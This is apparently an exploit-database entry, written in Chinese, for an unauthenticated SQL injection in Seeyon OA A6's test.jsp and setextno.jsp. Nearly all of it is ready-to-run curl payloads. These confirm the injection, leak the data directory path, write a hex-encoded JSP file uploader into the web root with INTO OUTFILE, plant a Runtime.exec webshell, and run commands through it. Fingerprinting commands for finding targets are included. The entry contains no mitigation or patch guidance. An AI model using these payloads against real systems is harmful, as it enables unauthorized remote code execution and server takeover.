---
id: SEEYON-A6-SQLI-RCE
title: 致远OA A6 test.jsp/setextno.jsp SQL注入写入Webshell
product: seeyon-oa
vendor: 致远互联
version_affected: "致远OA A6 all versions"
severity: CRITICAL
tags: [sqli, rce, file_write, 无需认证, 国产, oa]
fingerprint: ["致远", "seeyon", "A6", "A8+协同管理软件"]
---

## 漏洞描述

致远OA A6 的 test.jsp 和 setextno.jsp 文件存在 SQL 注入漏洞，攻击者无需认证即可通过 SQL 注入执行任意查询，并利用 MySQL 的 `SELECT INTO OUTFILE/DUMPFILE` 功能将 webshell 写入 Web 目录，最终实现远程代码执行。

## 影响版本

- 致远OA A6（所有已知版本）

## 前置条件

- 无需认证
- 目标运行致远OA A6
- 后端数据库为 MySQL 且具有 FILE 权限
- 需要知道 Web 目录绝对路径（可通过报错信息获取）

## 利用步骤

1. 通过 test.jsp SQLi 确认漏洞存在
2. 通过报错或 `@@datadir` 推断 Web 目录路径
3. 使用 `SELECT UNHEX(...) INTO DUMPFILE` 写入文件上传木马
4. 通过上传木马上传完整 webshell
5. 连接 webshell 获取服务器权限

## Payload

**test.jsp SQL注入 — 确认漏洞**

```bash
# 获取当前数据库名
curl -s "http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())"

# 验证 MD5 回显
curl -s "http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))" | grep "c4ca4238a0b923820dcc509a6f75849b"
```

**test.jsp — 获取 Web 路径**

```bash
curl -s "http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@datadir)"
```

**test.jsp — 写入文件上传木马（HEX 编码避免特殊字符）**

```bash
# HEX 编码的 JSP 文件上传器:
# <%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%>
curl -s "http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27/opt/seeyon/A6/tomcat/webapps/yyoa/upload.jsp%27"
```

**通过文件上传器写入 webshell**

```bash
curl -s "http://target/yyoa/upload.jsp?f=shell.jsp" \
  -X POST \
  -d 't=<%out.println(Runtime.getRuntime().exec(request.getParameter("cmd")));%>'
```

**setextno.jsp SQL注入 — Union 注入写入 webshell**

```bash
# Union 注入确认
curl -s "http://target/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)%20union%20all%20select%201,2,(md5(1)),4%23"

# 写入 webshell（同样使用 HEX 编码）
curl -s "http://target/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)%20union%20all%20select%201,2,(select%20unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E')%20into%20outfile%20'/opt/seeyon/A6/tomcat/webapps/yyoa/upload.jsp'),4%23"
```

## 验证方法

```bash
# test.jsp — 检查 MD5(1) 回显
curl -s "http://target/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))" | grep "c4ca4238a0b923820dcc509a6f75849b"

# setextno.jsp — 检查 MD5(1) 回显
curl -s "http://target/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999)%20union%20all%20select%201,2,(md5(1)),4%23" | grep "c4ca4238a0b923820dcc509a6f75849b"

# 写入 webshell 后验证
curl -s "http://target/yyoa/shell.jsp?cmd=whoami"
```

## 指纹确认

```bash
curl -s "http://target/yyoa/" | grep -i "致远\|seeyon\|A6"
curl -s "http://target/seeyon/" -o /dev/null -w "%{http_code}"
```
